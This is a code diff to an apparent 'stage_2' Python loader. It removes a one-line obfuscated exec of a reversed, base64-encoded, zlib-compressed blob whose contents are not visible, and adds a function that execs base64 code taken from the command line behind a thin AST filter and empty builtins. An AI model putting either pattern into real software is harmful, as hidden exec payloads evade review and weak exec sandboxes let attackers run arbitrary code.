@@ -1,3 +1,25 @@
-# I'm famous for writing readable and well documented code.
+import base64
+import zlib
+import ast
 
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+def run_payload(data):
+    # Decode and decompress
+    compressed = base64.b64decode(data)
+    source = zlib.decompress(compressed).decode('utf-8')
+    # Parse with AST and allow only expression or limited statements
+    tree = ast.parse(source, mode='exec')
+    for node in ast.walk(tree):
+        # Disallow import, exec, eval, subprocess, os, open
+        if isinstance(node, ast.Import) or isinstance(node, ast.ImportFrom):
+            raise ValueError("Imports not allowed")
+        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id in ('exec','eval','open', 'compile'):
+            raise ValueError("Disallowed function call")
+    compiled = compile(tree, '<payload>', 'exec')
+    exec(compiled, {'__builtins__': {}}, {})
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) != 2:
+        print("Usage: stage_2.py <base64data>")
+        sys.exit(1)
+    run_payload(sys.argv[1])
